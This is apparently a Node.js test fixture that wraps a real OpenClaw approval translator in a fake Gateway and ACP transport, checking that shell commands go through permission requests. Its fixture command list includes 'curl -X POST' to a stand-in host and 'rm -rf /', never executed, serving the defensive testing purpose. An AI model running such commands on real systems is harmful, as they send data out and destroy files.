#!/usr/bin/env node
// SPDX-License-Identifier: AGPL-3.0-or-later
// Fake Gateway and ACP transport around the REAL published approval translator.
import { createInterface } from 'node:readline';
import { appendFileSync } from 'node:fs';
import { loadOpenclawPackage } from './openclaw-package-proof.mjs';
const { AcpTranslatorAgentEvents, extractExecDirective, requiresExecApproval } = loadOpenclawPackage(process.env.OPENCLAW_PACKAGE_DIR);
const write = obj => process.stdout.write(`${JSON.stringify(obj)}\n`);
let nextId = 100;
const waiting = new Map();
const connection = { requestPermission: params => new Promise(resolve => {
  const id = nextId++; waiting.set(id, resolve);
  write({ jsonrpc: '2.0', id, method: 'session/request_permission', params });
}) };
const commands = ['printf fixture', 'curl -X POST https://example.invalid/send', 'rm -rf /'];
const pending = { sessionId: 'real-openclaw-session', sessionKey: 'fixture-key', idempotencyKey: 'fixture-run' };
const prompts = new Map([['fixture-run', pending]]);
const gateway = { request: async (method, params) => {
  if (method === 'exec.approval.get') return { commandText: commands[Number(params.id)], host: 'gateway', allowedDecisions: ['allow-once', 'deny'] };
  if (method === 'exec.approval.resolve') { appendFileSync(process.env.OPENCLAW_WITNESS_LOG, `${JSON.stringify(params)}\n`); return {}; }
  throw new Error(`Unexpected Gateway method ${method}`);
} };
const translator = new AcpTranslatorAgentEvents(connection, gateway, {}, prompts, new Map(), () => pending, () => pending, msg => process.stderr.write(`${msg}\n`));
for await (const line of createInterface({ input: process.stdin })) {
  let msg; try { msg = JSON.parse(line); } catch { continue; }
  if (!msg.method) { waiting.get(msg.id)?.(msg.result); waiting.delete(msg.id); continue; }
  if (msg.method === 'initialize') write({ jsonrpc: '2.0', id: msg.id, result: { protocolVersion: 1, agentCapabilities: { loadSession: true }, authMethods: [] } });
  else if (msg.method === 'session/new' || msg.method === 'session/load') write({ jsonrpc: '2.0', id: msg.id, result: { sessionId: pending.sessionId } });
  else if (msg.method === 'session/prompt') {
    void (async () => {
      const directive = extractExecDirective(msg.params.prompt.map(p => p.text ?? '').join('\n'));
      if (!requiresExecApproval({ ask: directive.execAsk, security: directive.execSecurity })) throw new Error('Exec did not require approval');
      for (const [i, command] of commands.entries()) {
        // The upstream class constructs the request and resolves the Gateway decision.
        const relay = { approvalId: String(i), runId: pending.idempotencyKey, sessionId: pending.sessionId, state: 'active' };
        translator.approvalRelays.set(relay.approvalId, relay);
        await translator.runApprovalRelay(relay, { approvalId: String(i), command, host: 'gateway' });
      }
      write({ jsonrpc: '2.0', method: 'session/update', params: { sessionId: pending.sessionId, update: { sessionUpdate: 'agent_message_chunk', content: { type: 'text', text: 'Offline fixture finished; commands were never executed.' } } } });
      write({ jsonrpc: '2.0', id: msg.id, result: { stopReason: 'end_turn' } });
    })().catch(error => write({ jsonrpc: '2.0', id: msg.id, error: { code: -32000, message: String(error) } }));
  } else if (msg.id !== undefined) write({ jsonrpc: '2.0', id: msg.id, result: {} });
}
